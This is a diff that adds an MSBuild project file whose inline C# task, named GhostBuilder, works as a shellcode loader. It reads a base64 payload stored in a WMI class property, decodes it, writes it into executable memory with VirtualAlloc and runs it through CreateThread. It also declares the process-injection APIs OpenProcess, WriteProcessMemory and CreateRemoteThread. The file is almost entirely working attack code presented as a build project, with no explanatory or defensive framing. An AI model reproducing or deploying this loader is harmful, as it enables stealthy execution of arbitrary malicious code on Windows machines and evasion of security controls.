@@ -1,1 +1,136 @@
-test
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <Target Name="GhostBuild">
+   <GhostBuilder />
+  </Target>
+<UsingTask
+    TaskName="GhostBuilder"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+        <Reference Include="System.Management" />
+        <Reference Include="System.Runtime.InteropServices" />
+
+        <Code Type="Class" Language="cs">
+            <![CDATA[
+                using System;
+                using System.IO;
+                using System.Reflection;
+                using System.IO.Compression;
+                using System.Collections;
+                using System.Collections.Generic;
+                using Microsoft.Build.Framework;
+                using Microsoft.Build.Utilities;
+                using System.Linq;
+                using System.Text;
+                using System.Runtime.InteropServices;
+                using System.ComponentModel;
+                using System.Configuration;
+                using System.Diagnostics;
+                using System.Management;
+
+
+                public class GhostBuilder :  Task, ITask
+                {
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+            uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+ 
+
+        const int PROCESS_CREATE_THREAD = 0x0002;
+        const int PROCESS_QUERY_INFORMATION = 0x0400;
+        const int PROCESS_VM_OPERATION = 0x0008;
+        const int PROCESS_VM_WRITE = 0x0020;
+        const int PROCESS_VM_READ = 0x0010;
+
+
+        const uint MEM_COMMIT = 0x00001000;
+        const uint MEM_RESERVE = 0x00002000;
+        const uint PAGE_READWRITE = 4;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+
+       
+          [DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
+          [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(            
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId           
+            );
+          [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(           
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );          
+
+
+                    public override bool Execute()
+                    {
+                        
+                        Console.WriteLine("test");
+  
+  ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM meta_class WHERE __class = 'Win32_OSRecoveryConfigurationData'");
+            ManagementObjectCollection myDiskCollection = searcher.Get();
+
+            string result = string.Empty;
+
+            foreach (ManagementBaseObject pe in myDiskCollection)
+            {
+                Console.WriteLine(pe.GetPropertyValue("Description"));
+                 string shellcode = pe.GetPropertyValue("Description").ToString();
+
+                result = shellcode;
+            }
+
+
+            byte[] shell = Convert.FromBase64String(result);
+         
+
+                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shell.Length,
+            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+              Marshal.Copy(shell, 0, (IntPtr)(funcAddr), shell.Length);
+              IntPtr hThread = IntPtr.Zero;
+              UInt32 threadId = 0;
+              IntPtr pinfo = IntPtr.Zero;
+              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+              Console.WriteLine(threadId);
+              Console.WriteLine(hThread);
+              WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+            return true;
+                    
+                    }
+                }
+            ]]>
+        </Code>
+    </Task>
+    </UsingTask>
+</Project>
+
+
+
